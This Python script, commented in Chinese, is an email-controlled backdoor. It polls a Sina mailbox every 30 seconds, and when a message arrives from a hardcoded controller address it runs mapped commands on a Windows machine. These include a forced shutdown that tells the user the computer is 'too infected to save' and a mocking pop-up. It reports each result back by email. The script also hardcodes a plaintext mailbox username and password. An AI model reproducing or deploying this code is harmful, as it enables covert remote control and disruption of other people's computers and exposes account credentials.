# -*- coding:utf-8 -*-
from email.mime.text import MIMEText
import poplib
import smtplib
import time
import re
import os
import time
import win32api as win
class MailManager(object):

    def __init__(self):
        self.popHost = 'pop.sina.com'
        self.smtpHost = 'smtp.sina.com'
        self.port = 25
        self.userName = 'badaoxiashuo123@sina.com'
        self.passWord = '135456..'
        self.bossMail = '654017381@qq.com'
        self.login()
        self.configMailBox()

    # 登录邮箱
    def login(self):
        try:
            self.mailLink = poplib.POP3_SSL(self.popHost)
            self.mailLink.set_debuglevel(1)
            self.mailLink.user(self.userName)
            self.mailLink.pass_(self.passWord)
            self.mailLink.list()
            print (u'login success!')
        except Exception as e:
            print (u'login fail! ' + str(e))
            quit()

    # 获取邮件
    def retrMail(self):
        print (u'retriecing mail now...')
        try:
            ret=self.mailLink.list()
            mail_body=self.mailLink.retr(len(ret[1]))
            print("邮件抓取成功")
            return mail_body
        except Exception as e:
            print (str(e))
            return None
    def analysis_mail(self,mail_body):
        try:
            subject=re.search("'Subject:(.*?)'", str(mail_body[1])).group(1)
            sender=re.search("X-Sender:(.*?)'", str(mail_body[1])).group(1)
            command={'subject':subject.strip(),'sender':sender.strip()}
            print("提取subject和发件人成功")
            return command
        except Exception as e:
            print("提取subject和发件人失败"+str(e))
            return None
    def configMailBox(self):
        try:
            self.mail_box = smtplib.SMTP(self.smtpHost, self.port)
            self.mail_box.login(self.userName, self.passWord)
            print (u'config mailbox success!')
        except Exception as e:
            print (u'config mailbox fail! ' + str(e))
            quit()

    # 发送邮件
    def sendMsg(self, mail_body='Success!'):
        try:
            msg = MIMEText(mail_body, 'plain', 'utf-8')
            msg['Subject'] = mail_body
            msg['from'] = self.userName
            self.mail_box.sendmail(self.userName, self.bossMail, msg.as_string())
            print (u'send mail success!')
        except Exception as e:
            print (u'send mail fail! ' + str(e))

old_command=''
class executer(object):
    def __init__(self,exe):
        self.commands={'shutdown':r'shutdown -s -t 60 -c \"你的电脑已中毒太深,无法挽救,即将强制关闭,准备换一台电脑吧!\"',
              'dir':'drl'}
        self.win_actions={"messagebox":'小伙子别撸了,大伙正看着呢'}
        self.mail_manager=MailManager()
        self.exe=exe
    def execute(self): 
        global old_command
        subject=self.exe['subject']
        identity=self.exe['sender']
        if  subject in self.commands and identity==self.mail_manager.bossMail and self.commands[subject]!=old_command:
            try:
                command=self.commands[subject]
                os.system(command)
                print("执行命令成功!")
                old_command=command
                self.mail_manager.sendMsg(mail_body="执行命令成功!")
            except Exception as e:
                print("执行命令失败!"+str(e))    
                self.mail_manager.sendMsg(mail_body="执行命令失败!")
        elif subject in self.win_actions.keys()and identity==self.mail_manager.bossMail and self.win_actions[subject]!=old_command :
            try:
                action=self.win_actions[subject]
                win.MessageBox(0,action,'警告')
                print("执行命令成功!")
                old_command=action
                self.mail_manager.sendMsg(mail_body="执行命令成功!")
            except Exception as e:
                print("执行命令失败!"+str(e))    
                self.mail_manager.sendMsg(mail_body="执行命令失败!")
        else: 
            print("不存在这条命令!")
#             self.mail_manager.sendMsg(mail_body="不存在这条命令!")
if __name__ == '__main__':
    while True:
        mailmanager=MailManager()
        mailbody=mailmanager.retrMail() 
        command=mailmanager.analysis_mail(mailbody)
        execute=executer(command)
        execute.execute()
        time.sleep(30)
